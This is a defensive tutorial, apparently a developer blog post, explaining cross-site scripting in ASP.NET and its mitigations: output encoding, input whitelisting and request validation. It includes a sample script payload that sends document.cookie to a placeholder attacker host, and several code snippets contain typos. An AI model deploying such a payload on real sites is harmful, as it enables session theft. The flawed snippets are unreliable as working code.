# OWASP Top 10 #2 - Cross Site Scripting (XSS) #

## What is it? ##

Cross-site Scripting (XSS) is a variation of a code injection attack where an attacker injects client-side script onto a vulnerable website which is later unintentionally executed by a user.

The client side script could be VBScript, ActiveX, Flash or JavaScript.

The attack makes use of unvalidated or unencoded user input which is outputted by the website and then executed by the user's web browser.

## How does it happen? ##

In its simplest form a script is taken from a query string parameter;

```
www.foo.com/foo.aspx?q=foo<script> location.href = 'http://BadSite/DoSomethingBad.html?cookie='%2Bdocument.cookie</script>
```

Here our query string parameter contains a malicious payload:

```
<script> location.href = 'http://foo/dosomethingbad.html?cookie='%2Bdocument.cookie</script>
```

Rendering the requested parameter value as is within outputted html within a client browser, i.e. without any encoding, will cause the script to be executed. 

Here we show how an injected script could pass the value of a cookie to our hacker's site:

```
<span>
	You searched for <script> location.href = 'http://foo/dosomethingbad.html?cookie='%2Bdocument.cookie</script>
</span>
```

This cookie value could contain an authorisation token or other sensitive data which could be used to exploit the user further.

### Sources of an attack ###

The client side script or malicious payload can come from many sources:

- In the URL via a query string or route parameter
- Http form posted
- In cookies
- Http request headers
- Web services calls
- Persisted in databases
- Files such as XML, XSD, CSV

In fact anything which does not come directly from our source code should be treated as potentially malicious. That includes data and services from within the bounds of our company as well as data entered directly from our users, even if they are our colleagues operating on back office software.

## How can I protect myself from this? ##

Protection of an attack should be multi-layered to maximise the protection. Any breached layer is simply one of many layers providing protection.

### Output encoding ###

The primary method of mitigating from XSS attacks is to contextually escape untrusted and potentially unsafe data. This involves replacing certain string characters with their equivalent escaped and safe characters. 

For example with a html encoding scheme the < character is replaced with &lt; and the > character is replaced with  &gt;

The string

```
<b>Hello</b>
```

would be replaced with 

```
&ltbi&gt;Hello&lt;/b&gt;
```

The string would then be displayed as 

```
<b>Hello</b>
```

without the bold mark up being executed and the word hello being rendered in bold. The potentially malicious payload is made harmless.

There are several encoding schemes and the right one should be chosen depending upon where the untrusted user input is to be rendered into. These include HTML, JavaScript, CSS, URL and XML.

It is important that you use a well-proven library to implement output encoding and do not try to write your own.

### Encoding HTML ###

As of .NEt 4.5 the anti XSS tool is built into the .net framework.

```
using System.Web.Security.AntiXss;

var encodedString = AntiXssEncoder.HtmlEncode(inputString, true);

```

The second parameter determines whether to use named entities. For example this changes the copyright symbol to &copy;.

In previous versions of .NET you need to download the anti XSS library which can be found within NuGet.

#### Html Encode ####

The .NET framework also includes HttpUtility.HtmlEncode and Server.HtmlEncode.

**Please do not use these** as they simply encode the characters <, >, ", and &. This approach is not sufficient to prevent against XSS attacks. For example JavaScript such as "alert('smerfs');" injected into an attribute of an input element would be executed.

### JavaScript ###

Even in .NET 4.5, the anti xss capabilities does not extend to escaping JavaScript, you need to download the AntiXSS external library.

```
<script>
    var q = <%= Microsoft.Security.Application.encoder.JavaScriptEncode(Request.QueryString["foo"])%>
</script>
```

###Self Escaping Web forms controls in System.Web.UI###

When working with ASP.NET WebForms, some controls and their properties encode html, the following page highlights which do and which do not:
 
https://blogs.msdn.microsoft.com/sfaust/2008/09/02/which-asp-net-controls-automatically-encodes/

### Output encoding in MVC ###

The razor view engine automatically html encodes output by default.

```
// the following automatically escapes
@Html.Label("<b>Hello</b>")
```

When in the very rare circumstances you do not want encoding to occur you can explicitly override this functionality.

```
// Request non escaping with the raw command.
@Html.Raw("<b>Hello</b>")
```

## White listing allowable values ##

When collecting information from a user you should validate their input against a list of known safe values. This allows us to catch any invalid bad data very early on in the process.

Validation can be type conversion, regular expressions or even checking their inclusion from a list of known values such as colours or countries.

The following examines an input string is valid:

```
if(!RegEx,.IsMatch(searchTerm, @"^[\p{L} \.\-]+$")
{
   throw new ApplicationException("The search term is not allowed");
}
```

- \p{L} matches any kind of letter from any language
- \, matches the period character
- \-, matches the hyphen character
- + indicates any number of these characters
- ^ $ indicates that the input string starts and ends with these characters i.e. contains only these characters.

## Request Validation ##

.NET provides request validation, an inbuilt protection of XSS that looks at all incoming data from within forms, query string parameters, route sections, header values etc.  It will catch XSS attacks before it reaches your page.

This is enabled or disabled within the web.config:

```
 <pages validationRequest="true">
 </pages>
```

This functionality is available since .NET 2, though by default it appears to be disabled in versions less than 3.5.

ASP.NET will automatically throw a HTTPRequestValidationException when it detects an XSS attack.

The method  System.Web.HttpRequest.ValidateString is used to perform the check and raise the exception.


### Disabling Request Validation ###

#### Disabling Request Validation At The Page Level ####

We can disable request validation on a page level:

```
<%@ Page Title = "" ValidateRequest="false" Language "C#" />
```

#### Disabling Request Validation At The Control Level ####

We can disable validation for a specific control. 

```
<asp:button Id="myButton" runat="server" ValidateRequestMode="Disabled" />
```

This is a ASP.NET 4.5 feature and will need a change to the request validation model from 2.0 to 4.5:

```
<system.web>
<httpRuntime targetFramework="4.5" requestValidationMode="4.5" />
```


#### Disabling Request Validation When Requesting Data ####

We can disable the validation when getting data sent within the Http request. This is done by calling the Unvalidated method before any call to the Http request data.

```
var foo = Request.Unvalidated.QueryString["foo"];
```

#### Disable MVC ####

We can disable the validation request on model binding in MVC,

```
public class MyController {
	[HttpPost]
  	public void DoFoo(MyModel model)
    {
    }
}

public class MyModel {
	[AllowHtml]
	public string Myfield { get; set;}
}
```

The AllowHtml attribute placed on any model or model's field will allow that field to be bound to incoming data regardless of it's contents.

The default action is to not allow unsafe data, whereby an exception will be thrown if it is deemed unsafe.

## Other Encoding ##

The Anti-XSS library contains other methods for encoding data against XSS for URL, XML and other schemes.

More information can be found here:

https://msdn.microsoft.com/en-us/library/system.web.security.antixss.antixssencoder_methods%28v=vs.110%29.aspx